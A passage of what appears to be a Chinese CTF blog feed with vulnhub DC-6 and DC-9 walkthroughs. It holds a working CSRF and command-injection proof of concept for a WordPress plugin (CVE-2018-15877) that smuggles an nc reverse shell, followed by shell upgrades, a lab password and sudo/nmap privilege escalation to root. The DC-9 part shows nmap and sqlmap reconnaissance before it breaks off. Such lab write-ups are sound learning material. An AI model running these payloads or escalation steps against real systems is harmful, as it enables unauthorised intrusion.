class="keyword">in</span>/lydericlefebvre)</span><br><span class="line"></span><br><span class="line">Timeline:</span><br><span class="line">===========</span><br><span class="line">- 2018/08/25: Vulnerability found</span><br><span class="line">- 2018/08/25: CVE-ID request</span><br><span class="line">- 2018/08/26: Reported to developer</span><br><span class="line">- 2018/08/26: Fixed version</span><br><span class="line">- 2018/08/26: Advisory published on GitHub</span><br><span class="line">- 2018/08/26: Advisory sent to bugtraq mailing list</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">===========</span><br><span class="line">Plainview Activity Monitor Wordpress plugin is vulnerable to OS</span><br><span class="line"><span class="built_in">command</span> injection <span class="built_in">which</span> allows an attacker to remotely execute</span><br><span class="line">commands on underlying system. Application passes unsafe user supplied</span><br><span class="line">data to ip parameter into activities_overview.php.</span><br><span class="line">Privileges are required <span class="keyword">in</span> order to exploit this vulnerability, but</span><br><span class="line">this plugin version is also vulnerable to CSRF attack and Reflected</span><br><span class="line">XSS. Combined, these three vulnerabilities can lead to Remote Command</span><br><span class="line">Execution just with an admin click on a malicious link.</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">Plainviewæ´»åŠ¨ç›‘è§†å™¨Wordpressæ’ä»¶æ˜“å—æ“ä½œç³»ç»Ÿæ”»å‡»</span><br><span class="line">å…è®¸æ”»å‡»è€…è¿œç¨‹æ‰§è¡Œçš„å‘½ä»¤æ³¨å…¥</span><br><span class="line">åº•å±‚ç³»ç»Ÿä¸Šçš„å‘½ä»¤ã€‚åº”ç”¨ç¨‹åºä¼ é€’ç”¨æˆ·æä¾›çš„ä¸å®‰å…¨</span><br><span class="line">æ•°æ®åˆ°ipå‚æ•°è¿›å…¥æ´»åŠ¨_æ¦‚è¿°.php.</span><br><span class="line">æ”»å‡»æ­¤æ¼æ´éœ€è¦ç‰¹æƒï¼Œä½†æ˜¯</span><br><span class="line">è¿™ä¸ªæ’ä»¶ç‰ˆæœ¬ä¹Ÿå®¹æ˜“å—åˆ°CSRFæ”»å‡»å’Œåå°„</span><br><span class="line">XSSå…¬å¸ã€‚ç»¼åˆèµ·æ¥ï¼Œè¿™ä¸‰ä¸ªæ¼æ´å¯ä»¥å¯¼è‡´è¿œç¨‹å‘½ä»¤</span><br><span class="line">åªéœ€é€šè¿‡ç®¡ç†å‘˜ç‚¹å‡»æ¶æ„é“¾æ¥å³å¯æ‰§è¡Œã€‚</span><br><span class="line">*/</span><br><span class="line">References:</span><br><span class="line">===========</span><br><span class="line">https://github.com/aas-n/CVE/blob/master/CVE-2018-15877/</span><br><span class="line"></span><br><span class="line">PoC:</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!--  Wordpress Plainview Activity Monitor RCE</span><br><span class="line">        [+] Version: 20161228 and possibly prior</span><br><span class="line">        [+] Description: Combine OS Commanding and CSRF to get reverse shell</span><br><span class="line">        [+] Author: LydA(c)ric LEFEBVRE</span><br><span class="line">        [+] CVE-ID: CVE-2018-15877</span><br><span class="line">        [+] Usage: Replace 127.0.0.1 &amp; 9999 with you ip and port to get reverse shell</span><br><span class="line">        [+] Note: Many reflected XSS exists on this plugin and can be combine with this exploit as well</span><br><span class="line">  --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)&lt;/script&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;http://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools&quot;</span> method=<span class="string">&quot;POST&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">      &lt;input <span class="built_in">type</span>=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;ip&quot;</span> value=<span class="string">&quot;google.fr| nc -nlvp 127.0.0.1 9999 -e /bin/bash&quot;</span> /&gt;</span><br><span class="line">      &lt;input <span class="built_in">type</span>=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;lookup&quot;</span> value=<span class="string">&quot;Lookup&quot;</span> /&gt;</span><br><span class="line">      &lt;input <span class="built_in">type</span>=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Submit request&quot;</span> /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;root@JIYE:~/vulnhub/dc6<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<p><code>ä¿®æ”¹POC</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!--  Wordpress Plainview Activity Monitor RCE</span><br><span class="line">        [+] Version: 20161228 and possibly prior</span><br><span class="line">        [+] Description: Combine OS Commanding and CSRF to get reverse shell</span><br><span class="line">        [+] Author: LydA(c)ric LEFEBVRE</span><br><span class="line">        [+] CVE-ID: CVE-2018-15877</span><br><span class="line">        [+] Usage: Replace 127.0.0.1 &amp; 9999 with you ip and port to get reverse shell</span><br><span class="line">        [+] Note: Many reflected XSS exists on this plugin and can be combine with this exploit as well</span><br><span class="line">  --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)&lt;/script&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;http:wordy/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools&quot;</span> method=<span class="string">&quot;POST&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">      &lt;input <span class="built_in">type</span>=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;ip&quot;</span> value=<span class="string">&quot;google.fr| nc 192.168.1.6 9999 -e /bin/bash&quot;</span> /&gt;</span><br><span class="line">      &lt;input <span class="built_in">type</span>=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;lookup&quot;</span> value=<span class="string">&quot;Lookup&quot;</span> /&gt;</span><br><span class="line">      &lt;input <span class="built_in">type</span>=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Submit request&quot;</span> /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;root@JIYE:~/vulnhub/dc6<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<h2 id="0x07-åå¼¹shell"><a href="#0x07-åå¼¹shell" class="headerlink" title="0x07.åå¼¹shell"></a>0x07.åå¼¹shell</h2><h3 id="1-kaliç›‘å¬"><a href="#1-kaliç›‘å¬" class="headerlink" title="1.kaliç›‘å¬"></a>1.kaliç›‘å¬</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 9999</span></span><br></pre></td></tr></table></figure>

<h3 id="2-firefoxæ‰“å¼€"><a href="#2-firefoxæ‰“å¼€" class="headerlink" title="2.firefoxæ‰“å¼€"></a>2.firefoxæ‰“å¼€</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc6<span class="comment"># firefox 45274.html</span></span><br></pre></td></tr></table></figure>

<p><code>ç‚¹å‡»ï¼Œget shell</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 9999</span></span><br><span class="line">listening on [any] 9999 ...</span><br><span class="line">connect to [192.168.1.6] from (UNKNOWN) [192.168.1.3] 58196</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>

<h3 id="3-å‡çº§shell"><a href="#3-å‡çº§shell" class="headerlink" title="3.å‡çº§shell"></a>3.å‡çº§shell</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">www-data@dc-6:/var/www/html/wp-admin$</span><br></pre></td></tr></table></figure>

<h3 id="4-å†æ¬¡å‡çº§ä¸ºäº¤äº’shell"><a href="#4-å†æ¬¡å‡çº§ä¸ºäº¤äº’shell" class="headerlink" title="4.å†æ¬¡å‡çº§ä¸ºäº¤äº’shell"></a>4.å†æ¬¡å‡çº§ä¸ºäº¤äº’shell</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># stty raw -echo</span></span><br><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 9999</span></span><br><span class="line"></span><br><span class="line">www-data@dc-6:/var/www/html/wp-admin$ </span><br><span class="line">www-data@dc-6:/var/www/html/wp-admin$ </span><br><span class="line">www-data@dc-6:/var/www/html/wp-admin$ whoami</span><br><span class="line">www-data</span><br><span class="line">www-data@dc-6:/var/www/html/wp-admin$</span><br></pre></td></tr></table></figure>

<h2 id="0x08-ææƒ"><a href="#0x08-ææƒ" class="headerlink" title="0x08.ææƒ"></a>0x08.ææƒ</h2><h3 id="1ä½¿ç”¨sudo-l-å‘ç°éœ€è¦å¯†ç "><a href="#1ä½¿ç”¨sudo-l-å‘ç°éœ€è¦å¯†ç " class="headerlink" title="1ä½¿ç”¨sudo -l å‘ç°éœ€è¦å¯†ç "></a>1ä½¿ç”¨sudo -l å‘ç°éœ€è¦å¯†ç </h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@dc-6:/var/www/html$ sudo -l</span><br><span class="line"></span><br><span class="line">We trust you have received the usual lecture from the <span class="built_in">local</span> System</span><br><span class="line">Administrator. It usually boils down to these three things:</span><br><span class="line"></span><br><span class="line">    <span class="comment">#1) Respect the privacy of others.</span></span><br><span class="line">    <span class="comment">#2) Think before you type.</span></span><br><span class="line">    <span class="comment">#3) With great power comes great responsibility.</span></span><br><span class="line"></span><br><span class="line">[sudo] password <span class="keyword">for</span> www-data: </span><br><span class="line">Sorry, try again</span><br></pre></td></tr></table></figure>

<h3 id="2-æŸ¥çœ‹å…¶ä»–ç”¨æˆ·å®¶ç›®å½•æ–‡ä»¶"><a href="#2-æŸ¥çœ‹å…¶ä»–ç”¨æˆ·å®¶ç›®å½•æ–‡ä»¶" class="headerlink" title="2.æŸ¥çœ‹å…¶ä»–ç”¨æˆ·å®¶ç›®å½•æ–‡ä»¶"></a>2.æŸ¥çœ‹å…¶ä»–ç”¨æˆ·å®¶ç›®å½•æ–‡ä»¶</h3><p><code>å‘ç°grahamå¯†ç ï¼šGSo7isUM1D4</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@dc-6:/home$ ls *</span><br><span class="line">graham:</span><br><span class="line"></span><br><span class="line">jens:</span><br><span class="line">backups.sh</span><br><span class="line"></span><br><span class="line">mark:</span><br><span class="line">stuff</span><br><span class="line"></span><br><span class="line">sarah:</span><br><span class="line">www-data@dc-6:/home$ cat jens/backups.sh </span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">tar -czf backups.tar.gz /var/www/html</span><br><span class="line">www-data@dc-6:/home$ <span class="built_in">cd</span> mark/stuff/</span><br><span class="line">www-data@dc-6:/home/mark/stuff$ ls</span><br><span class="line">things-to-do.txt</span><br><span class="line">www-data@dc-6:/home/mark/stuff$ cat things-to-do.txt </span><br><span class="line">Things to <span class="keyword">do</span>:</span><br><span class="line"></span><br><span class="line">- Restore full functionality <span class="keyword">for</span> the hyperdrive (need to speak to Jens)</span><br><span class="line">- Buy present <span class="keyword">for</span> Sarah<span class="string">&#x27;s farewell party</span></span><br><span class="line"><span class="string">- Add new user: graham - GSo7isUM1D4 - done</span></span><br><span class="line"><span class="string">- Apply for the OSCP course</span></span><br><span class="line"><span class="string">- Buy new laptop for Sarah&#x27;</span>s replacement</span><br><span class="line">www-data@dc-6:/home/mark/stuff$</span><br></pre></td></tr></table></figure>

<p><code>grahamç™»å…¥</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@dc-6:/home/mark/stuff$ su graham</span><br><span class="line">Password: </span><br><span class="line">graham@dc-6:/home/mark/stuff$ whoami</span><br><span class="line">graham</span><br></pre></td></tr></table></figure>

<p><code>sudo -lï¼Œå‘ç°/home/jens/backups.shå¯ä»¥è¿›è¡Œåˆ©ç”¨</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">graham@dc-6:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> graham on dc-6:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User graham may run the following commands on dc-6:</span><br><span class="line">    (jens) NOPASSWD: /home/jens/backups.sh</span><br><span class="line">graham@dc-6:~$ </span><br></pre></td></tr></table></figure>

<p><code>ä¿®æ”¹backups.shè¿›è¡Œåˆ©ç”¨ï¼Œå¾—åˆ°jensç”¨æˆ·</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">graham@dc-6:/home/jens$ ls -l</span><br><span class="line">total 4</span><br><span class="line">-rwxrwxr-x 1 jens devs 61 Aug 27 19:06 backups.sh</span><br><span class="line">graham@dc-6:/home/jens$ cat backups.sh </span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#tar -czf backups.tar.gz /var/www/html</span></span><br><span class="line">/bin/bash</span><br><span class="line">graham@dc-6:/home/jens$ sudo -u jens ./backups.sh </span><br><span class="line">jens@dc-6:~</span><br></pre></td></tr></table></figure>

<p><code>sudo -lå‘ç°nmapå¯ä»¥è¿›è¡Œææƒ</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jens@dc-6:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> jens on dc-6:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User jens may run the following commands on dc-6:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/nmap</span><br><span class="line">jens@dc-6:~$ </span><br></pre></td></tr></table></figure>

<h3 id="3-nmapææƒå‚è€ƒ"><a href="#3-nmapææƒå‚è€ƒ" class="headerlink" title="3.nmapææƒå‚è€ƒ"></a>3.nmapææƒ<span class="exturl" data-url="aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvbm1hcC8jc2hlbGw=">å‚è€ƒ<i class="fa fa-external-link-alt"></i></span></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jens@dc-6:~$ <span class="built_in">echo</span> <span class="string">&#x27;os.execute(&quot;/bin/bash&quot;)&#x27;</span> &gt; CTF</span><br><span class="line">jens@dc-6:~$ sudo -u root nmap --script=CTF</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.40 ( https://nmap.org ) at 2020-08-27 19:50 AEST</span><br><span class="line">NSE: Warning: Loading <span class="string">&#x27;CTF&#x27;</span> -- the recommended file extension is <span class="string">&#x27;.nse&#x27;</span>.</span><br><span class="line">root@dc-6:/home/jens<span class="comment"># root@dc-6:/home/jens# root@dc-6:/home/jens#</span></span><br></pre></td></tr></table></figure>

<h3 id="4-è¿™é‡Œææƒä¹‹åä¸èƒ½æ•²ä»»ä½•å‘½ä»¤ï¼Œæ‰€ä»¥ä½¿ç”¨pythonææƒ"><a href="#4-è¿™é‡Œææƒä¹‹åä¸èƒ½æ•²ä»»ä½•å‘½ä»¤ï¼Œæ‰€ä»¥ä½¿ç”¨pythonææƒ" class="headerlink" title="4.è¿™é‡Œææƒä¹‹åä¸èƒ½æ•²ä»»ä½•å‘½ä»¤ï¼Œæ‰€ä»¥ä½¿ç”¨pythonææƒ"></a>4.è¿™é‡Œææƒä¹‹åä¸èƒ½æ•²ä»»ä½•å‘½ä»¤ï¼Œæ‰€ä»¥ä½¿ç”¨pythonææƒ</h3><blockquote>
<p>python -c â€˜import pty;pty.spawn(â€œ/bin/bashâ€)â€™        // å¤åˆ¶ç²˜è´´</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@dc-6:/home/jens<span class="comment"># root@dc-6:/home/jens# root@dc-6:/home/jens# </span></span><br><span class="line">root@dc-6:/home/jens<span class="comment"># </span></span><br><span class="line">root@dc-6:/home/jens<span class="comment"># </span></span><br><span class="line">root@dc-6:/home/jens<span class="comment"># </span></span><br><span class="line">root@dc-6:/home/jens<span class="comment"># </span></span><br><span class="line">root@dc-6:/home/jens<span class="comment"># ls</span></span><br><span class="line">backups.sh  CTF</span><br><span class="line">root@dc-6:/home/jens<span class="comment"># cd /root</span></span><br><span class="line">root@dc-6:~<span class="comment"># ls</span></span><br><span class="line">theflag.txt</span><br><span class="line">root@dc-6:~<span class="comment"># cat theflag.txt </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Yb        dP 888888 88     88         8888b.   dP<span class="string">&quot;Yb  88b 88 888888 d8b </span></span><br><span class="line"><span class="string"> Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P </span></span><br><span class="line"><span class="string">  YbdPYbdP   88&quot;</span><span class="string">&quot;   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88&quot;</span><span class="string">&quot;   `&quot;</span><span class="string">&#x27; </span></span><br><span class="line"><span class="string">   YP  YP    888888 88ood8 88ood8     8888Y&quot;   YbodP  88  Y8 888888 (8) </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulations!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those</span></span><br><span class="line"><span class="string">who have provided feedback, and who have taken time to complete these little</span></span><br><span class="line"><span class="string">challenges.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">If you enjoyed this CTF, send me a tweet via @DCAU7.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@dc-6:~#</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>vulnhub</category>
        <category>DC</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-9</title>
    <url>/2020/09/02/DC-9/</url>
    <content><![CDATA[<h2 id="0x00-å®˜ç½‘æè¿°"><a href="#0x00-å®˜ç½‘æè¿°" class="headerlink" title="0x00.å®˜ç½‘æè¿°"></a>0x00.å®˜ç½‘æè¿°</h2><blockquote>
<p>DC-9 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.</p>
<p>The ultimate goal of this challenge is to get root and to read the one and only flag.</p>
<p>Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</p>
<p>For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I wonâ€™t give you the answer, instead, Iâ€™ll give you an idea about how to move forward.</p>
</blockquote>
<a id="more"></a>

<h2 id="0x01-è€è§„çŸ©nmap"><a href="#0x01-è€è§„çŸ©nmap" class="headerlink" title="0x01.è€è§„çŸ©nmap"></a>0x01.è€è§„çŸ©nmap</h2><p><code>å¯ä»¥å‘ç°1ä¸ºç½‘å…³ï¼Œ2ä¸ºå®¿ä¸»æœºï¼Œ6ä¸ºkaliï¼Œé‚£ä¹ˆ8å°±æ˜¯æˆ‘ä»¬çš„å—å®³è€…</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment"># nmap -sP 192.168.1.0/24 -oN nmap.sP</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-02 02:16 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.1</span><br><span class="line">Host is up (0.0026s latency).</span><br><span class="line">MAC Address: 68:D1:BA:1F:FD:48 (Shenzhen Youhua Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.2</span><br><span class="line">Host is up (0.00032s latency).</span><br><span class="line">MAC Address: 50:5B:C2:8C:BE:A5 (Liteon Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.8</span><br><span class="line">Host is up (0.00028s latency).</span><br><span class="line">MAC Address: 00:0C:29:D7:7C:A8 (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.6</span><br><span class="line">Host is up.</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="keyword">in</span> 2.08 seconds</span><br><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h2 id="0x02-ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£"><a href="#0x02-ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£" class="headerlink" title="0x02.ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£"></a>0x02.ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£</h2><p><code>å¯ä»¥å‘ç°å¼€æ”¾äº†22/80ç«¯å£ï¼Œå‘ç°sshçŠ¶æ€ä¸ºfilteredï¼ˆè¿‡æ»¤ï¼‰ï¼Œæ¨æµ‹å®‰è£…äº†knockd</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment"># nmap -sC -sV -v 192.168.1.8 -oN nmap.demo</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-02 02:17 EDT</span><br><span class="line">NSE: Loaded 151 scripts <span class="keyword">for</span> scanning.</span><br><span class="line">NSE: Script Pre-scanning.</span><br><span class="line">Initiating NSE at 02:17</span><br><span class="line">Completed NSE at 02:17, 0.00s elapsed</span><br><span class="line">Initiating NSE at 02:17</span><br><span class="line">Completed NSE at 02:17, 0.00s elapsed</span><br><span class="line">Initiating NSE at 02:17</span><br><span class="line">Completed NSE at 02:17, 0.00s elapsed</span><br><span class="line">Initiating ARP Ping Scan at 02:17</span><br><span class="line">Scanning 192.168.1.8 [1 port]</span><br><span class="line">Completed ARP Ping Scan at 02:17, 0.03s elapsed (1 total hosts)</span><br><span class="line">Initiating Parallel DNS resolution of 1 host. at 02:17</span><br><span class="line">Completed Parallel DNS resolution of 1 host. at 02:17, 0.03s elapsed</span><br><span class="line">Initiating SYN Stealth Scan at 02:17</span><br><span class="line">Scanning 192.168.1.8 [1000 ports]</span><br><span class="line">Discovered open port 80/tcp on 192.168.1.8</span><br><span class="line">Completed SYN Stealth Scan at 02:17, 0.06s elapsed (1000 total ports)</span><br><span class="line">Initiating Service scan at 02:17</span><br><span class="line">Scanning 1 service on 192.168.1.8</span><br><span class="line">Completed Service scan at 02:17, 6.25s elapsed (1 service on 1 host)</span><br><span class="line">NSE: Script scanning 192.168.1.8.</span><br><span class="line">Initiating NSE at 02:17</span><br><span class="line">Completed NSE at 02:17, 0.91s elapsed</span><br><span class="line">Initiating NSE at 02:17</span><br><span class="line">Completed NSE at 02:17, 0.00s elapsed</span><br><span class="line">Initiating NSE at 02:17</span><br><span class="line">Completed NSE at 02:17, 0.00s elapsed</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.8</span><br><span class="line">Host is up (0.00011s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE    SERVICE VERSION</span><br><span class="line">22/tcp filtered ssh</span><br><span class="line">80/tcp open     http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Example.com - Staff Details - Welcome</span><br><span class="line">MAC Address: 00:0C:29:D7:7C:A8 (VMware)</span><br><span class="line"></span><br><span class="line">NSE: Script Post-scanning.</span><br><span class="line">Initiating NSE at 02:17</span><br><span class="line">Completed NSE at 02:17, 0.00s elapsed</span><br><span class="line">Initiating NSE at 02:17</span><br><span class="line">Completed NSE at 02:17, 0.00s elapsed</span><br><span class="line">Initiating NSE at 02:17</span><br><span class="line">Completed NSE at 02:17, 0.00s elapsed</span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 7.92 seconds</span><br><span class="line">           Raw packets sent: 1001 (44.028KB) | Rcvd: 1001 (40.064KB)</span><br><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h2 id="0x03-å‘ç°80ç«¯å£ï¼Œç›´æ¥è®¿é—®"><a href="#0x03-å‘ç°80ç«¯å£ï¼Œç›´æ¥è®¿é—®" class="headerlink" title="0x03.å‘ç°80ç«¯å£ï¼Œç›´æ¥è®¿é—®"></a>0x03.å‘ç°80ç«¯å£ï¼Œç›´æ¥è®¿é—®</h2><p><code>å‘ç°äº†ä¸€äº›ç”¨æˆ·ï¼Œä¸€ä¸ªç™»å…¥æ¡†ï¼Œä¸€ä¸ªæœç´¢æ¡†ï¼Œå°±æ²¡æœ‰å…¶ä»–æœ‰ç”¨çš„ä¿¡æ¯äº†</code></p>
<img src="/2020/09/02/DC-9/image-20200902144807899.png" class>

<img src="/2020/09/02/DC-9/image-20200902144920353.png" class>

<img src="/2020/09/02/DC-9/image-20200902144932737.png" class>

<h2 id="0x04-æŠ“åŒ…ï¼Œæ‰«ææ³¨å…¥ç‚¹"><a href="#0x04-æŠ“åŒ…ï¼Œæ‰«ææ³¨å…¥ç‚¹" class="headerlink" title="0x04.æŠ“åŒ…ï¼Œæ‰«ææ³¨å…¥ç‚¹"></a>0x04.æŠ“åŒ…ï¼Œæ‰«ææ³¨å…¥ç‚¹</h2><h3 id="1-è¿™é‡Œå¯¹æœç´¢æ¡†ä¸ç™»å…¥æ¡†è¿›è¡Œäº†æŠ“åŒ…"><a href="#1-è¿™é‡Œå¯¹æœç´¢æ¡†ä¸ç™»å…¥æ¡†è¿›è¡Œäº†æŠ“åŒ…" class="headerlink" title="1.è¿™é‡Œå¯¹æœç´¢æ¡†ä¸ç™»å…¥æ¡†è¿›è¡Œäº†æŠ“åŒ…"></a>1.è¿™é‡Œå¯¹æœç´¢æ¡†ä¸ç™»å…¥æ¡†è¿›è¡Œäº†æŠ“åŒ…</h3><img src="/2020/09/02/DC-9/image-20200902145133305.png" class>

<h3 id="2-ç¼–è¾‘æ–‡ä»¶"><a href="#2-ç¼–è¾‘æ–‡ä»¶" class="headerlink" title="2.ç¼–è¾‘æ–‡ä»¶"></a>2.ç¼–è¾‘æ–‡ä»¶</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment"># cat demo.txt </span></span><br><span class="line">POST /results.php HTTP/1.1</span><br><span class="line">Host: 192.168.1.8</span><br><span class="line">Content-Length: 8</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36</span><br><span class="line">Origin: http://192.168.1.8</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://192.168.1.8/search.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: SESS6ea13d7ee6970decd87c6ae82c8909ff=6hCT-InqREqWsLqJQMvcblMzdjfBuTsTvOqLVecWfjs; PHPSESSID=pdng34438k3h323o5l59vk46k4</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">search=1</span><br><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<h3 id="3-æ‰«ææ³¨å…¥ç‚¹ï¼Œå‘ç°searchå­˜åœ¨æ³¨å…¥"><a href="#3-æ‰«ææ³¨å…¥ç‚¹ï¼Œå‘ç°searchå­˜åœ¨æ³¨å…¥" class="headerlink" title="3.æ‰«ææ³¨å…¥ç‚¹ï¼Œå‘ç°searchå­˜åœ¨æ³¨å…¥"></a>3.æ‰«ææ³¨å…¥ç‚¹ï¼Œå‘ç°searchå­˜åœ¨æ³¨å…¥</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment"># sqlmap -r demo.txt --dbs --batch</span></span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[<span class="string">&quot;]_____ ___ ___  &#123;1.4.8#stable&#125;</span></span><br><span class="line"><span class="string">|_ -| . [,]     | .&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [)]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse 